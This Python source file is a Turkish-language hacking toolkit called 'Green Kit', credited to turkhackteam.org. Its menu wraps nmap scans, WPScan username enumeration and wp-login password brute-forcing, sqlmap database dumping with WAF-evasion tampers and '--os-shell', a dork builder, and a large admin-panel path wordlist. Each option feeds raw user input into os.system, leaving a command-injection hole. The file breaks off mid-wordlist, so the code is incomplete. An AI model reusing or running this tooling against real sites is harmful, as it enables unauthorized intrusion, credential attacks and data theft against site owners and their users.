# !/usr/bin/env python
# -*- coding: utf-8 -*-
# turkhackteam.org/net
# Coded By Connec - Safak-Bey
#  .::Green Team::.

import os
import time
from termcolor import colored
import requests
import proxybroker
from googlesearch import search
import sys
import warnings
import random
from http import cookiejar

# Green Kit Başlık
baslik = "\033[0;31m\033[1m[\033[0;32m\033[1mGreen\033[0;31m\033[1m]>\033[1m\033[0;32m "

# Renkler
sifirla = "\033[0m"
kirmizi = "\033[1;31m"
yesil = "\033[1;32m"
cyan = "\033[1;36m"

# Semboller
yildiz = kirmizi + "[" + yesil + "*" + kirmizi + "]" + sifirla
arti = kirmizi + "[" + yesil + "+" + kirmizi + "]" + sifirla
eksi = kirmizi + "[" + yesil + "-" + kirmizi + "]" + sifirla
bulundu = kirmizi + "[" + yesil + "BULUNDU" + kirmizi + "]" + sifirla
bulunamadi = kirmizi + "[" + yesil + "BULUNAMADI" + kirmizi + "]" + sifirla
soru_isareti = kirmizi + "[" + yesil + "?" + kirmizi + "]" + sifirla
unlem = kirmizi + "[" + yesil + "!" + kirmizi + "]" + sifirla

menu = "\033[1m" + """
  ____                       _  ___ _   
 / ___|_ __ ___  ___ _ __   | |/ (_) |_ 
| |  _| '__/ _ \/ _ \ '_ \  | ' /| | __|
| |_| | | |  __/  __/ | | | | . \| | |_ 
 \____|_|  \___|\___|_| |_| |_|\_\_|\__|

\033[0;31m[\033[0;33m1\033[0;31m]> \033[0;32m\033[1mNmap - Ağ Taramasi
\033[0;31m[\033[0;33m2\033[0;31m]> \033[0;32m\033[1mWpScan - WordPress Site Hacking
\033[0;31m[\033[0;33m3\033[0;31m]> \033[0;32m\033[1mSqlMap - SQL Hacking
\033[0;31m[\033[0;33m4\033[0;31m]> \033[0;32m\033[1mAdmin Panel Bulucu
\033[0;31m[\033[0;33m5\033[0;31m]> \033[0;32m\033[1mNikto - Sitede Zaafiyet Tespiti
\033[0;31m[\033[0;33m6\033[0;31m]> \033[0;32m\033[1mAssetfinder - SubDomain Tespiti
\033[0;31m[\033[0;33m7\033[0;31m]> \033[0;32m\033[1mSubjack - SubDomain Takeover Tespiti
\033[0;31m[\033[0;33m8\033[0;31m]> \033[0;32m\033[1mDmitry - Bilgi Toplama
\033[0;31m[\033[0;33m9\033[0;31m]> \033[0;32m\033[1mWafW00f - Firewall Tespiti
\033[0;31m[\033[0;33mh\033[0;31m]> \033[0;32m\033[1mHelp
\033[0;31m[\033[0;33me\033[0;31m]> \033[0;32m\033[1mExit
"""
print(colored(menu, "green"))
try:
    while True:
        islem = input(baslik)

        if (islem == "1"):

            print("""\033[0;31m[\033[0;33m*\033[0;31m]> \033[1;32mNmap Tarama bölümüne hoş geldiniz.
\033[0;31m[\033[0;33m1\033[0;31m]> \033[0;32mNormal Tarama
\033[0;31m[\033[0;33m2\033[0;31m]> \033[0;32mHızlı Tarama
\033[0;31m[\033[0;33m3\033[0;31m]> \033[0;32mAgresif Tarama
\033[0;31m[\033[0;33m4\033[0;31m]> \033[0;32mAğı Tarama
\033[0;31m[\033[0;33m5\033[0;31m]> \033[0;32mToplu Tarama
\033[0;31m[\033[0;33m6\033[0;31m]> \033[0;32mAğdaki IP Adreslerini Öğrenme
\033[0;31m[\033[0;33m7\033[0;31m]> \033[0;32mServis ve Versiyon Bilgisi
\033[0;31m[\033[0;33m8\033[0;31m]> \033[0;32mİşletim Sistemi Bilgisi
\033[0;31m[\033[0;33m9\033[0;31m]> \033[0;32mAna Menüye Dön
            """)

            try:
                while True:
                    soru = input(baslik)

                    if (soru == "1"):
                        ip = input(yildiz + " Hedef IP: ")
                        os.system("nmap " + ip + " --open")
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "2"):
                        ip = input(yildiz + " Hedef IP: ")
                        os.system("nmap " + ip + " -Pn -sS -n -v --top-ports 20 --open")
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "3"):
                        ip = input(yildiz + " Hedef IP: ")
                        os.system("nmap " + ip + " -A")
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "4"):
                        ip = input(yildiz + " Ağ Adresiniz (ör:192.168.1.0/24): ")
                        os.system("nmap " + ip)
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "5"):
                        liste = input(yildiz + " Hedef IP listeniz (ör:ips.txt): ")
                        os.system("nmap iL" + liste)
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "6"):
                        ip = input(yildiz + " Ağ Adresiniz (ör:192.168.1.0/24): ")
                        os.system("nmap " + ip + " -sn -n -v --open")
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "7"):
                        ip = input(yildiz + " Hedef IP: ")
                        os.system("nmap " + ip + " -sS -sV")
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "8"):
                        ip = input(yildiz + " Hedef IP: ")
                        os.system("nmap " + ip + " -O | grep OS")
                        print(arti + " Tarama başarıyla tamamlandı.")

                    elif (soru == "9"):
                        print(arti + " Ana menüye dönülüyor...\n")
                        print(colored(menu, "green"))
                        break

                    else:
                        print(unlem + " Geçerli bir işlem seçiniz...")
                        time.sleep(2)

            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                """)
                exit()

        elif (islem == "2"):
            print("""\033[0;31m[\033[0;33m*\033[0;31m]> \033[1;32mWordPress Saldırı bölümüne hoş geldiniz.
\033[0;31m[\033[0;33m1\033[0;31m]> \033[0;32mKullanıcı Adı Bulma
\033[0;31m[\033[0;33m2\033[0;31m]> \033[0;32mKaba Kuvvet Saldırısı
\033[0;31m[\033[0;33m3\033[0;31m]> \033[0;32mEklenti Tarama
\033[0;31m[\033[0;33m4\033[0;31m]> \033[0;32mTema Tarma
\033[0;31m[\033[0;33m5\033[0;31m]> \033[0;32mAna Menüye Dön
            """)

            try:
                while True:
                    islem = input(baslik)

                    if (islem == "1"):
                        link = input(yildiz + " Site Linki: ")
                        os.system("wpscan --url " + link + " -e u --random-user-agent")

                    elif (islem == "2"):
                        link = input(yildiz + " Site Linki: ")
                        username = input(yildiz + " Kullanıcı Adı: ")
                        wordlist = input(yildiz + " Wordlist Dizini: ")
                        os.system(
                            "wpscan --url " + link + " --usernames " + username + " --passwords " + wordlist + " --password-attack wp-login --random-user-agent")

                    elif (islem == "3"):
                        link = input(yildiz + " Site Linki: ")
                        os.system("wpscan --url " + link + " --enumerate p --random-user-agent")

                    elif (islem == "3"):
                        link = input(yildiz + " Site Linki: ")
                        os.system("wpscan --url " + link + " --enumerate t --random-user-agent")

                    elif (islem == "5"):
                        print(arti + " Ana Menüye Dönülüyor.")
                        print(colored(menu, "green"))
                        break

                    else:
                        print(unlem + " Geçerli bir işlem seçiniz...")
                        time.sleep(2)

            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                                """)
                exit()

        elif (islem == "3"):
            print("""\033[0;31m[\033[0;33m*\033[0;31m]> \033[1;32mSQLi bölümüne hoş geldiniz.
\033[0;31m[\033[0;33m!\033[0;31m]> \033[1;32mDatabase çekme işlemlerinde tüm işlemleri 1'den başlayarak sırayla yapınız.
\033[0;31m[\033[0;33m1\033[0;31m]> \033[0;32mDatabase Çek
\033[0;31m[\033[0;33m2\033[0;31m]> \033[0;32mTablo Çek
\033[0;31m[\033[0;33m3\033[0;31m]> \033[0;32mKolon Çek
\033[0;31m[\033[0;33m4\033[0;31m]> \033[0;32mDump
\033[0;31m[\033[0;33m5\033[0;31m]> \033[0;32mShell Atma
\033[0;31m[\033[0;33m6\033[0;31m]> \033[0;32mDork Maker
\033[0;31m[\033[0;33m7\033[0;31m]> \033[0;32mAna Menüye Dön
            """)
            try:
                while True:
                    islem = input(baslik)

                    if (islem == "1"):
                        global site
                        site = input(yildiz + " Açıklı Link: ")
                        os.system(
                            "sqlmap -u " + site + " --random-agent --tamper=\"between,randomcase,space2comment\" --level=3 --risk=3 --skip-waf --hex --time-sec=3 --threads=2 --drop-set-cookie --answers=\"optimize=Y\" --batch -v 3 --dbs")
                    elif (islem == "2"):
                        global database_ismi
                        database_ismi = input(yildiz + " Database İsmi:: ")
                        os.system(
                            "sqlmap -u " + site + " --random-agent --tamper=\"between,randomcase,space2comment\" --level=3 --risk=3 --skip-waf --hex --time-sec=3 --threads=2 --drop-set-cookie --answers=\"optimize=Y\" --batch -v 3 -D " + database_ismi + " --tables")
                    elif (islem == "3"):
                        global tablo_ismi
                        tablo_ismi = input(yildiz + " Tablo İsmi: ")
                        os.system(
                            "sqlmap -u " + site + " --random-agent --tamper=\"between,randomcase,space2comment\" --level=3 --risk=3 --skip-waf --hex --time-sec=3 --threads=2 --drop-set-cookie --answers=\"optimize=Y\" --batch -v 3 -D " + database_ismi + " -T " + tablo_ismi + " --columns")
                    elif (islem == "4"):
                        dumpp = input(yildiz + " Dump Edilecek Veri: ")
                        os.system(
                            "sqlmap -u " + site + " --random-agent --tamper=\"between,randomcase,space2comment\" --level=3 --risk=3 --skip-waf --hex --time-sec=3 --threads=2 --drop-set-cookie --answers=\"optimize=Y\" --batch -v 3 -D " + database_ismi + " -T" + tablo_ismi + " -C " + dumpp + " --dump")
                    elif (islem == "5"):
                        print("""\033[0;31m[\033[0;33m1\033[0;31m]> \033[0;32mAtilabilirliği Kontrol Et
\033[0;31m[\033[0;33m2\033[0;31m]> \033[0;32mShell At
                            """)
                        islemm = input(baslik)
                        if (islemm == "1"):
                            hsite = input(yildiz + " Acikli Link: ")
                            print(colored(
                                unlem + " Eger | --> current user is DBA : True <-- | sonucunu alırsak shell atilabilir...",
                                "red"))
                            time.sleep(1.5)
                            os.system(
                                "sqlmap -u " + hsite + " --random-agent --tamper=\"between,randomcase,space2comment\" --level=3 --risk=3 --skip-waf --hex --time-sec=3 --threads=2 --drop-set-cookie --answers=\"optimize=Y\" --batch -v 3 --current-user --is-dba")
                        elif (islemm == "2"):
                            hsite = input(yildiz + " Acikli Link: ")
                            print(colored(unlem + " Eğer shell atılabilirse sitenin yazıldığı dille aynı dili seçin...",
                                          "red"))
                            time.sleep(4)
                            os.system(
                                "sqlmap -u " + hsite + " --random-agent --tamper=\"between,randomcase,space2comment\" --level=3 --risk=3 --skip-waf --hex --time-sec=3 --threads=2 --drop-set-cookie --answers=\"optimize=Y\" -v 3 --current-user --os-shell")
                    elif (islem == "6"):
                        site = input(unlem + " Site Adı ve Uzantısı: ")
                        inurl = input(unlem + " URL'de Geçecek Şeyler: ")
                        intext = input(unlem + " Sitede Yazacak Şeyler: ")
                        filetype = input(unlem + " Dosya Tipi: ")
                        intitle = input(unlem + " Sitenin Başliği: ")
                        print(colored(arti + " Dork hazırlanıyor...", "red"))
                        time.sleep(1.5)
                        print(colored(
                            arti + " site:" + site + " inurl:" + inurl + " intext:" + intext + " filetype:" + filetype + " intitle:" + intitle,
                            "yellow"))
                        print(colored(unlem + " Sadece yanı dolu olanları kopyalayınız.", "red"))
                    elif (islem == "7"):
                        print(arti + " Ana Menüye Dönülüyor...")
                        break
                    else:
                        print(unlem + " Geçerli bir işlem seçiniz...")
                        time.sleep(2)

            except KeyboardInterrupt:
                print("""
Çıkış Yapılıyor...
                                """)
                exit()

        elif (islem == "4"):

            denenecekler = ["admin/", "administrator/", "admin1/", "admin2/", "admin3/", "admin4/", "admin5/",
                            "usuarios/",
                            "/admin/index.php", "usuario/", "moderator/", "webadmin/", "adminarea/", "bb-admin/",
                            "adminLogin/",
                            "admin_area/", "panel-administracion/", "instadmin/", "memberadmin/", "administratorlogin/",
                            "adm/",
                            "admin/account.php", "admin/index.php", "admin/login.php", "admin/admin.php",
                            "admin_area/admin.php",
                            "admin_area/login.php", "siteadmin/login.php", "siteadmin/index.php",
                            "siteadmin/login.html",
                            "admin/account.html", "admin/index.html", "admin/login.html", "admin/admin.html",
                            "admin_area/index.php", "bb-admin/index.php", "bb-admin/login.php", "bb-admin/admin.php",
                            "admin/home.php", "admin_area/login.html", "admin_area/index.html",
                            "admin/controlpanel.php",
                            "admin.php", "admincp/index.asp", "admincp/login.asp", "admincp/index.html",
                            "adminpanel.html",
                            "webadmin.html", "webadmin/index.html", "webadmin/admin.html", "webadmin/login.html",
                            "admin/admin_login.html", "admin_login.html", "panel-administracion/login.html",
                            "admin/cp.php",
                            "cp.php", "administrator/index.php", "administrator/login.php", "nsw/admin/login.php",
                            "webadmin/login.php", "admin/admin_login.php", "admin_login.php",
                            "administrator/account.php",
                            "administrator.php", "admin_area/admin.html", "pages/admin/admin-login.php",
                            "admin/admin-login.php",
                            "admin-login.php", "bb-admin/index.html", "bb-admin/login.html", "acceso.php",
                            "bb-admin/admin.html",
                            "admin/home.html", "login.php", "modelsearch/login.php", "moderator.php",
                            "moderator/login.php",
                            "moderator/admin.php", "account.php", "pages/admin/admin-login.html",
                            "admin/admin-login.html",
                            "admin-login.html", "controlpanel.php", "admincontrol.php", "admin/adminLogin.html",
                            "adminLogin.html",
                            "home.html", "rcjakar/admin/login.php", "adminarea/index.html", "adminarea/admin.html",
                            "webadmin.php",
                            "webadmin/index.php", "webadmin/admin.php", "admin/controlpanel.html", "admin.html",
                            "admin/cp.html",
                            "cp.html", "adminpanel.php", "moderator.html", "administrator/index.html",
                            "administrator/login.html",
                            "user.html", "administrator/account.html", "administrator.html", "login.html",
                            "modelsearch/login.html",
                            "moderator/login.html", "adminarea/login.html", "panel-administracion/index.html",
                            "panel-administracion/admin.html", "modelsearch/index.html", "modelsearch/admin.html",
                            "admincontrol/login.html", "adm/index.html", "adm.html", "moderator/admin.html", "user.php",
                            "account.html", "controlpanel.html", "admincontrol.html", "panel-administracion/login.php",
                            "wp-login.php", "adminLogin.php", "admin/adminLogin.php", "home.php", "adminarea/index.php",
                            "adminarea/admin.php", "adminarea/login.php", "panel-administracion/index.php",
                            "panel-administracion/admin.php", "modelsearch/index.php", "modelsearch/admin.php",
                            "admincontrol/login.php", "adm/admloginuser.php", "admloginuser.php", "admin2.php",
                            "admin2/login.php",
                            "admin2/index.php", "usuarios/login.php", "adm/index.php", "adm.php", "affiliate.php",
                            "adm_auth.php",
                            "memberadmin.php", "administratorlogin.php", "account.asp", "admin/account.asp",
                            "admin/index.asp",
                            "admin/login.asp", "admin/admin.asp", "admin_area/admin.asp", "admin_area/login.asp",
                            "admin_area/index.asp", "bb-admin/index.asp", "bb-admin/login.asp", "bb-admin/admin.asp",
                            "admin/home.asp", "admin/controlpanel.asp", "admin.asp", "pages/admin/admin-login.asp",
                            "admin/admin-login.asp", "admin-login.asp", "admin/cp.asp", "cp.asp",
                            "administrator/account.asp",
                            "administrator.asp", "acceso.asp", "login.asp", "modelsearch/login.asp", "moderator.asp",
                            "moderator/login.asp", "administrator/login.asp", "moderator/admin.asp", "controlpanel.asp",
                            "user.asp",
                            "admincontrol.asp", "adminpanel.asp", "webadmin.asp", "webadmin/index.asp",
                            "webadmin/admin.asp",
                            "webadmin/login.asp", "admin/admin_login.asp", "admin_login.asp",
                            "panel-administracion/login.asp",
                            "adminLogin.asp", "admin/adminLogin.asp", "home.asp", "adminarea/index.asp",
                            "adminarea/admin.asp",
                            "adminarea/login.asp", "panel-administracion/index.asp", "panel-administracion/admin.asp",
                            "modelsearch/index.asp", "modelsearch/admin.asp", "administrator/index.asp",
                            "admincontrol/login.asp",
                            "adm/admloginuser.asp", "admloginuser.asp", "admin2.asp", "admin2/login.asp",
                            "admin2/index.asp",
                            "adm/index.asp", "adm.asp", "affiliate.asp", "adm_auth.asp", "memberadmin.asp",
                            "administratorlogin.asp", "siteadmin/login.asp", "siteadmin/index.asp", "admin/account.cfm",
                            "admin/index.cfm", "admin/login.cfm", "admin/admin.cfm", "admin_area/admin.cfm",
                            "admin_area/login.cfm",
                            "siteadmin/login.cfm", "siteadmin/index.cfm", "admin_area/index.cfm", "bb-admin/index.cfm",
                            "bb-admin/login.cfm", "bb-admin/admin.cfm", "admin/home.cfm", "admin/controlpanel.cfm",
                            "admin.cfm",
                            "admin/cp.cfm", "cp.cfm", "administrator/index.cfm", "administrator/login.cfm",
                            "nsw/admin/login.cfm",
                            "webadmin/login.cfm", "admin/admin_login.cfm", "admin_login.cfm",
                            "administrator/account.cfm",
                            "administrator.cfm", "pages/admin/admin-login.cfm", "admin/admin-login.cfm",
                            "admin-login.cfm",
                            "login.cfm", "modelsearch/login.cfm", "moderator.cfm", "moderator/login.cfm",
                            "moderator/admin.cfm",
                            "account.cfm", "controlpanel.cfm", "admincontrol.cfm", "acceso.cfm",
                            "rcjakar/admin/login.cfm",
                            "webadmin.cfm", "webadmin/index.cfm", "webadmin/admin.cfm", "adminpanel.cfm", "user.cfm",
                            "panel-administracion/login.cfm", "wp-login.cfm", "adminLogin.cfm", "admin/adminLogin.cfm",
                            "home.cfm",
                            "adminarea/index.cfm", "adminarea/admin.cfm", "adminarea/login.cfm",
                            "panel-administracion/index.cfm",
                            "panel-administracion/admin.cfm", "modelsearch/index.cfm", "modelsearch/admin.cfm",
                            "admincontrol/login.cfm", "adm/admloginuser.cfm", "admloginuser.cfm", "admin2.cfm",
                            "admin2/login.cfm",
                            "admin2/index.cfm", "usuarios/login.cfm", "adm/index.cfm", "adm.cfm", "affiliate.cfm",
                            "adm_auth.cfm",
                            "memberadmin.cfm", "administratorlogin.cfm", "admin/account.js", "admin/index.js",
                            "admin/login.js",
                            "admin/admin.js", "admin_area/admin.js", "admin_area/login.js", "siteadmin/login.js",
                            "siteadmin/index.js", "admin_area/index.js", "bb-admin/index.js", "bb-admin/login.js",
                            "bb-admin/admin.js", "admin/home.js", "admin/controlpanel.js", "admin.js", "admin/cp.js",
                            "cp.js",
                            "administrator/index.js", "administrator/login.js", "nsw/admin/login.js",
                            "webadmin/login.js",
                            "admin/admin_login.js", "admin_login.js", "administrator/account.js",
                            "pages/admin/admin-login.js",
                            "admin/admin-login.js", "admin-login.js", "login.js", "administrator.js",
                            "modelsearch/login.js",
                            "moderator.js", "moderator/login.js", "account.js", "controlpanel.js", "admincontrol.js",
                            "rcjakar/admin/login.js", "moderator/admin.js", "webadmin.js", "webadmin/index.js",
                            "acceso.js",
                            "webadmin/admin.js", "adminpanel.js", "user.js", "panel-administracion/login.js",
                            "wp-login.js",
                            "adminLogin.js", "admin/adminLogin.js", "home.js", "adminarea/index.js",
                            "adminarea/admin.js",
                            "adminarea/login.js", "panel-administracion/index.js", "panel-administracion/admin.js",
                            "modelsearch/index.js", "modelsearch/admin.js", "admincontrol/login.js",
                            "adm/admloginuser.js",
                            "admloginuser.js", "admin2.js", "admin2/login.js", "admin2/index.js", "usuarios/login.js",
                            "adm/index.js", "adm.js", "affiliate.js", "adm_auth.js", "memberadmin.js",
                            "administratorlogin.js",
                            "admin/account.cgi", "admin/index.cgi", "admin/login.cgi", "admin/admin.cgi",
                            "admin_area/admin.cgi",
                            "admin_area/login.cgi", "siteadmin/login.cgi", "siteadmin/index.cgi",
                            "admin_area/index.cgi",
                            "bb-admin/index.cgi", "bb-admin/login.cgi", "bb-admin/admin.cgi", "admin/home.cgi",
                            "admin/controlpanel.cgi", "admin.cgi", "admin/cp.cgi", "cp.cgi", "administrator/index.cgi",
                            "administrator/login.cgi", "nsw/admin/login.cgi", "webadmin/login.cgi",
                            "admin/admin_login.cgi",
                            "admin_login.cgi", "administrator/account.cgi", "administrator.cgi",
                            "pages/admin/admin-login.cgi",
                            "admin/admin-login.cgi", "admin-login.cgi", "login.cgi", "modelsearch/login.cgi",
                            "moderator.cgi",
                            "moderator/login.cgi", "moderator/admin.cgi", "account.cgi", "controlpanel.cgi",
                            "admincontrol.cgi",
                            "rcjakar/admin/login.cgi", "webadmin.cgi", "webadmin/index.cgi", "acceso.cgi",
                            "webadmin/admin.cgi",
                            "adminpanel.cgi", "user.cgi", "panel-administracion/login.cgi", "wp-login.cgi",
                            "adminLogin.cgi",
                            "admin/adminLogin.cgi", "home.cgi", "adminarea/index.cgi", "adminarea/admin.cgi",
                            "adminarea/login.cgi",
                            "panel-administracion/index.cgi", "panel-administracion/admin.cgi", "modelsearch/index.cgi",
                            "modelsearch/admin.cgi", "admincontrol/login.cgi", "adm/admloginuser.cgi",
                            "admloginuser.cgi",
                            "admin2.cgi", "admin2/login.cgi", "admin2/index.cgi", "usuarios/login.cgi", "adm/index.cgi",
                            "adm.cgi",
                            "affiliate.cgi", "adm_auth.cgi", "memberadmin.cgi", "administratorlogin.cgi",
                            "admin_panel/",
                            "admin_panel.html", "adm_cp/", "/acceso.asp", "/acceso.php", "/access/", "/access.php",
                            "/account/",
                            "/account.asp", "/account.html", "/account.php", "/acct_login/", "/_adm_/", "/_adm/",
                            "/adm/",
                            "/adm2/",
                            "/adm/admloginuser.asp", "/adm/admloginuser.php", "/adm.asp", "/adm_auth.asp",
                            "/adm_auth.php",
                            "/adm.html", "/_admin_/", "/_admin/", "/admin/", "/Admin/", "/ADMIN/", "/admin1/",
                            "/admin1.asp",
                            "/admin1.html", "/admin1.php", "/admin2/", "/admin2.asp", "/admin2.html", "/admin2/index/",
                            "/admin2/index.asp", "/admin2/index.php", "/admin2/login.asp", "/admin2/login.php",
                            "/admin2.php",
                            "/admin3/", "/admin4/", "/admin4_account/", "/admin4_colon/", "/admin5/",
                            "/admin/account.asp",
                            "/admin/account.html", "/admin/account.php", "/admin/add_banner.php/", "/admin/addblog.php",
                            "/admin/add_gallery_image.php", "/admin/add.php", "/admin/add-room.php",
                            "/admin/add-slider.php",
                            "/admin/add_testimonials.php", "/admin/admin/", "/admin/adminarea.php", "/admin/admin.asp",
                            "/admin/AdminDashboard.php", "/admin/admin-home.php", "/admin/AdminHome.php",
                            "/admin/admin.html",
                            "/admin/admin_index.php", "/admin/admin_login.asp", "/admin/admin-login.asp",
                            "/admin/adminLogin.asp",
                            "/admin/admin_login.html", "/admin/admin-login.html", "/admin/adminLogin.html",
                            "/admin/admin_login.php", "/admin/admin-login.php", "/admin/adminLogin.php",
                            "/admin/admin_management.php", "/admin/admin.php", "/admin/admin_users.php",
                            "/admin/adminview.php",
                            "/admin/adm.php", "/admin_area/", "/adminarea/", "/admin_area/admin.asp",
                            "/adminarea/admin.asp",
                            "/admin_area/admin.html", "/adminarea/admin.html", "/admin_area/admin.php",
                            "/adminarea/admin.php",
                            "/admin_area/index.asp", "/adminarea/index.asp", "/admin_area/index.html",
                            "/adminarea/index.html",
                            "/admin_area/index.php", "/adminarea/index.php", "/admin_area/login.asp",
                            "/adminarea/login.asp",
                            "/admin_area/login.html", "/adminarea/login.html", "/admin_area/login.php",
                            "/adminarea/login.php",
                            "/admin.asp", "/admin/banner.php", "/admin/banners_report.php", "/admin/category.php",
                            "/admin/change_gallery.php", "/admin/checklogin.php", "/admin/configration.php",
                            "/admincontrol.asp",
                            "/admincontrol.html", "/admincontrol/login.asp", "/admincontrol/login.html",
                            "/admincontrol/login.php",
                            "/admin/control_pages/admin_home.php", "/admin/controlpanel.asp",
                            "/admin/controlpanel.html",
                            "/admin/controlpanel.php", "/admincontrol.php", "/admincontrol.php/", "/admin/cpanel.php",
                            "/admin/cp.asp", "/admin/CPhome.php", "/admin/cp.html", "/admincp/index.asp",
                            "/admincp/index.html",
                            "/admincp/login.asp", "/admin/cp.php", "/admin/dashboard/index.php", "/admin/dashboard.php",
                            "/admin/dashbord.php", "/admin/dash.php", "/admin/default.php", "/adm/index.asp",
                            "/adm/index.html",
                            "/adm/index.php", "/admin/enter.php", "/admin/event.php", "/admin/form.php",
                            "/admin/gallery.php",
                            "/admin/headline.php", "/admin/home.asp", "/admin/home.html", "/admin_home.php",
                            "/admin/home.php",
                            "/admin.html", "/admin/index.asp", "/admin/index-digital.php", "/admin/index.html",
                            "/admin/index_ref.php", "/admin/initialadmin.php", "/administer/", "/administr8/",
                            "/administr8.asp",
                            "/administr8.html", "/administr8.php", "/administracion.php", "/administrador/",
                            "/administratie/",
                            "/administration/", "/administration.html", "/administration.php", "/administrator",
                            "/_administrator_/", "/_administrator/", "/administrator/", "/administrator/account.asp",
                            "/administrator/account.html", "/administrator/account.php", "/administratoraccounts/",
                            "/administrator.asp", "/administrator.html", "/administrator/index.asp",
                            "/administrator/index.html",
                            "/administrator/index.php", "/administratorlogin/", "/administrator/login.asp",
                            "/administratorlogin.asp", "/administrator/login.html", "/administrator/login.php",
                            "/administratorlogin.php", "/administratorlogin.php", "/administrator.php",
                            "/administrators/",
                            "/administrivia/", "/admin/leads.php", "/admin/list_gallery.php", "/admin/login",
                            "/adminLogin/",
                            "/admin_login.asp", "/admin-login.asp", "/admin/login.asp", "/adminLogin.asp",
                            "/admin/login-home.php",
                            "/admin_login.html", "/admin-login.html", "/admin/login.html", "/adminLogin.html",
                            "/ADMIN/login.html",
                            "/admin_login.ph", "/admin_login.php]", "/admin-login.php", "/admin-login.php/",
                            "/admin/login.php",
                            "/adminLogin.php", "/ADMIN/login.php", "/adminlogin_success.php", "/admin/loginsuccess.php",
                            "/admin/log.php", "/admin_main.html", "/admin/main_page.php", "/admin/main.php/",
                            "/admin/ManageAdmin.php", "/admin/manageImages.php", "/admin/manage_team.php",
                            "/admin/member_home.php",
                            "/admin/moderator.php", "/admin/my_account.php", "/admin/myaccount.php",
                            "/admin/overview.php",
                            "/admin/page_management.php", "/admin/pages/home_admin.php", "/adminpanel/",
                            "/adminpanel.asp",
                            "/adminpanel.html", "/adminpanel.php", "/admin.php", "/Adin/private/", "/adminpro/",
                            "/admin/product.php", "/admin/products.php", "/admins/", "/admins.asp", "/admin/save.php",
                            "/admins.html", "/admin/slider.php", "/admin/specializations.php", "/admins.php",
                            "/admin_tool/",
                            "/AdminTools/", "/admin/uhome.html", "/admin/upload.php", "/admin/userpage.php",
                            "/admin/viewblog.php",
                            "/admin/viewmembers.php", "/admin/voucher.php", "/AdminWeb/", "/admin/welcomepage.php",
                            "/admin/welcome.php", "/admloginuser.asp", "/admloginuser.php", "/admon/", "/ADMON/",
                            "/adm.php",
                            "/affiliate.asp", "/affiliate.php", "/auth/", "/auth/login/", "/authorize.php",
                            "/autologin/",
                            "/banneradmin/", "/base/admin/", "/bb-admin/", "/bbadmin/", "/bb-admin/admin.asp",
                            "/bb-admin/admin.html", "/bb-admin/admin.php", "/bb-admin/index.asp",
                            "/bb-admin/index.html",
                            "/bb-admin/index.php", "/bb-admin/login.asp", "/bb-admin/login.html", "/bb-admin/login.php",
                            "/bigadmin/", "/blogindex/", "/cadmins/", "/ccms/", "/ccms/index.php", "/ccms/login.php",
                            "/ccp14admin/", "/cms/", "/cms/admin/", "/cmsadmin/", "/cms/_admin/logon.php",
                            "/cms/login/",
                            "/configuration/", "/configure/", "/controlpanel/", "/controlpanel.asp",
                            "/controlpanel.html",
                            "/controlpanel.php", "/cpanel/", "/cPanel/", "/cpanel_file/", "/cp.asp", "/cp.html",
                            "/cp.php",
                            "/customer_login/", "/database_administration/", "/Database_Administration/",
                            "/db/admin.php",
                            "/directadmin/", "/dir-login/", "/editor/", "/edit.php", "/evmsadmin/", "/ezsqliteadmin/",
                            "/fileadmin/", "/fileadmin.asp", "/fileadmin.html", "/fileadmin.php", "/formslogin/",
                            "/forum/admin",
                            "/globes_admin/", "/home.asp", "/home.html", "/home.php", "/hpwebjetadmin/",
                            "/include/admin.php",
                            "/includes/login.php", "/Indy_admin/", "/instadmin/", "/interactive/admin.php",
                            "/irc-macadmin/",
                            "/links/login.php", "/LiveUser_Admin/", "/login/", "/login1/", "/login.asp", "/login_db/",
                            "/loginflat/", "/login.html", "/login/login.php", "/login.php", "/login-redirect/",
                            "/logins/",
                            "/login-us/", "/logon/", "/logo_sysadmin/", "/Lotus_Domino_Admin/", "/macadmin/",
                            "/mag/admin/",
                            "/maintenance/", "/manage_admin.php", "/manager/", "/manager/ispmgr/", "/manuallogin/",
                            "/memberadmin/",
                            "/memberadmin.asp", "/memberadmin.php", "/members/", "/memlogin/", "/meta_login/",
                            "/modelsearch/admin.asp", "/modelsearch/admin.html", "/modelsearch/admin.php",
                            "/modelsearch/index.asp",
                            "/modelsearch/index.html", "/modelsearch/index.php", "/modelsearch/login.asp",
                            "/modelsearch/login.html", "/modelsearch/login.php", "/moderator/", "/moderator/admin.asp",
                            "/moderator/admin.html", "/moderator/admin.php", "/moderator.asp", "/moderator.html",
                            "/moderator/login.asp", "/moderator/login.html", "/moderator/login.php", "/moderator.php",
                            "/moderator.php/", "/myadmin/", "/navSiteAdmin/", "/newsadmin/", "/nsw/admin/login.php",
                            "/openvpnadmin/", "/pages/admin/admin-login.asp", "/pages/admin/admin-login.html",
                            "/pages/admin/admin-login.php", "/panel/", "/panel-administracion/",
                            "/panel-administracion/admin.asp",
                            "/panel-administracion/admin.html", "/panel-administracion/admin.php",
                            "/panel-administracion/index.asp", "/panel-administracion/index.html",
                            "/panel-administracion/index.php", "/panel-administracion/login.asp",
                            "/panel-administracion/login.html", "/panel-administracion/login.php", "/panelc/",
                            "/paneldecontrol/",
                            "/panel.php", "/pgadmin/", "/phpldapadmin/", "/phpmyadmin/", "/phppgadmin/",
                            "/phpSQLiteAdmin/",
                            "/platz_login/", "/pma/", "/power_user/", "/project-admins/", "/pureadmin/", "/radmind/",
                            "/radmind-1/",
                            "/rcjakar/admin/login.php", "/rcLogin/", "/server/", "/Server/", "/ServerAdministrator/",
                            "/server_admin_small/", "/Server.asp", "/Server.html", "/Server.php", "/showlogin/",
                            "/simpleLogin/",
                            "/site/admin/", "/siteadmin/", "/siteadmin/index.asp", "/siteadmin/index.php",
                            "/siteadmin/login.asp",
                            "/siteadmin/login.html", "/site_admin/login.php", "/siteadmin/login.php", "/smblogin/",
                            "/sql-admin/",
                            "/sshadmin/", "/ss_vms_admin_sm/", "/staradmin/", "/sub-login/", "/Super-Admin/",
                            "/support_login/",
                            "/sys-admin/", "/sysadmin/", "/SysAdmin/", "/SysAdmin2/", "/sysadmin.asp", "/sysadmin.html",
